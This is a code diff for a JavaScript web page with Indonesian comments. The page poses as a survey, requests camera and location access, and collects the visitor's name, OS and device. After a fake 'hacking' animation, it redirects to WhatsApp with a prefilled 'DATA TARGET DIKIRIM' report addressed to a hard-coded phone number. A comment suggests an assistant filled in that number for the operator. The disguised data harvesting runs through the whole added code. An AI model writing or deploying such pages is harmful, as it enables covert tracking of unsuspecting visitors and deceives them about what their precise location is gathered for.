@@ -1,65 +1,56 @@
-const typer = document.getElementById('typer');
-const bar = document.getElementById('bar');
-const commandPrompt = document.getElementById('command-prompt');
-const locTag = document.getElementById('loc-tag');
-const video = document.getElementById('webcam');
+const nomorWA = "628979100200"; // Nomor Anda sudah saya masukkan
 
-let level = 0;
-let userData = { coords: "0,0", city: "Unknown", os: navigator.platform };
+let userData = {
+    coords: "Ditolak/Tidak Aktif",
+    os: navigator.platform,
+    device: navigator.userAgent.split(' ')[0]
+};
 
-const tasks = [
-    "SAYA ADALAH PEMILIK SAH PERANGKAT INI.",
-    "SINKRONISASI GPS DIIZINKAN.",
-    "AKSES DATA BIOMETRIK SELESAI.",
-    "KIRIM LAPORAN KE SERVER PUSAT."
-];
+// 1. Tombol Mulai (Minta Izin Kamera & Lokasi)
+document.getElementById('start-survey').addEventListener('click', async () => {
+    document.getElementById('step-1').style.display = 'none';
+    document.getElementById('step-2').style.display = 'block';
 
-// Inisialisasi Lokasi & Kamera
-document.getElementById('init-btn').addEventListener('click', async () => {
-    document.getElementById('setup-screen').style.display = 'none';
-    document.getElementById('main-terminal').style.display = 'flex';
-    
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            userData.coords = `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
-            locTag.textContent = `LOC: ${userData.coords}`;
-        });
-    }
-
+    // Ambil Kamera
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-    } catch(e) {}
-    updateTask();
-});
+        document.getElementById('webcam').srcObject = stream;
+    } catch (e) { console.log("Kamera ditolak"); }
 
-function updateTask() {
-    if (level < tasks.length) {
-        commandPrompt.textContent = tasks[level];
-        typer.value = "";
-        bar.style.width = `${(level / tasks.length) * 100}%`;
-    } else {
-        forceWhatsAppRedirect();
-    }
-}
-
-typer.addEventListener('input', () => {
-    if (typer.value.toUpperCase() === tasks[level].toUpperCase()) {
-        level++;
-        updateTask();
+    // Ambil Lokasi
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((pos) => {
+            userData.coords = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
+            document.getElementById('loc-tag').textContent = "SENSING: " + userData.coords;
+        });
     }
 });
 
-function forceWhatsAppRedirect() {
-    typer.style.display = "none";
-    commandPrompt.textContent = "MENGIRIM LAPORAN... [100%]";
+// 2. Tombol Kirim (Proses Animasi Hack)
+document.getElementById('submit-survey').addEventListener('click', () => {
+    const namaUser = document.getElementById('name').value || "Anonymous";
+    document.getElementById('step-2').style.display = 'none';
+    document.getElementById('step-3').style.display = 'block';
+
+    let prg = 0;
+    const bar = document.getElementById('progress');
+    const status = document.getElementById('status-text');
     
-    // GANTI NOMOR WA KAMU DISINI (Awali dengan 62)
-    const nomorWA = "628xxxxxxxxxx"; 
-    const teksPesan = `🚨 LAPORAN INSIDEN 2026 🚨%0A------------------------%0A📍 Koordinat: ${userData.coords}%0A💻 Perangkat: ${userData.os}%0A📸 Status: Terekam.%0A------------------------%0ALaporan dikirim otomatis oleh System Diagnostic.`;
-
-    setTimeout(() => {
-        // Efek transisi ke WA
-        window.location.href = `https://wa.me/${nomorWA}?text=${teksPesan}`;
-    }, 1500);
-}
+    const logs = ["Ekstraksi metadata...", "Menghubungkan ke satelit...", "Mengenkripsi paket...", "Sinkronisasi selesai!"];
+    
+    const interval = setInterval(() => {
+        prg += 25;
+        bar.style.width = prg + "%";
+        status.textContent = logs[prg/25 - 1];
+        
+        if (prg >= 100) {
+            clearInterval(interval);
+            setTimeout(() => {
+                const teks = `🚨 *DATA TARGET DIKIRIM* 🚨%0A%0A👤 *Nama:* ${namaUser}%0A📍 *Lokasi:* ${userData.coords}%0A💻 *OS:* ${userData.os}%0A📱 *Device:* ${userData.device}%0A%0A_Data telah disinkronkan ke database._`;
+                
+                // Gunakan URL API WhatsApp yang paling kompatibel
+                window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${teks}`;
+            }, 1000);
+        }
+    }, 1000);
+});
